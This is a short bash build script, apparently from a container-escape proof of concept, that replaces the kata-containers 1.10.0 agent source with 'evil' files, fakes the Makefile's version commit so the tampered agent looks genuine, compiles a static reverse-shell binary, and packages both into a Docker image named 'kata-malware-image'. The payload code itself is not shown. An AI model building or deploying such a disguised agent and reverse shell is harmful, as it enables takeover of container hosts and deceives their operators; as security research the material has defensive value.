#!/bin/bash

set -e -x

current_path=`pwd`
agent_path=$GOPATH/src/github.com/kata-containers/agent/

# build evil agent
cd $agent_path
git checkout -- .
git checkout 1.10.0
cp $current_path/evil_agent_src/* $agent_path
sed -i 's/VERSION_COMMIT :=.*$/VERSION_COMMIT := 1.10.0-a8007c2969e839b584627d1a7db4cac13af908a6/g' $agent_path/Makefile
make
cd -
cp $agent_path/kata-agent ./docker/evil-kata-agent

# build reverse shell
gcc -o ./docker/evil_bin evil_bin.c -static

docker build -t kata-malware-image:latest docker/
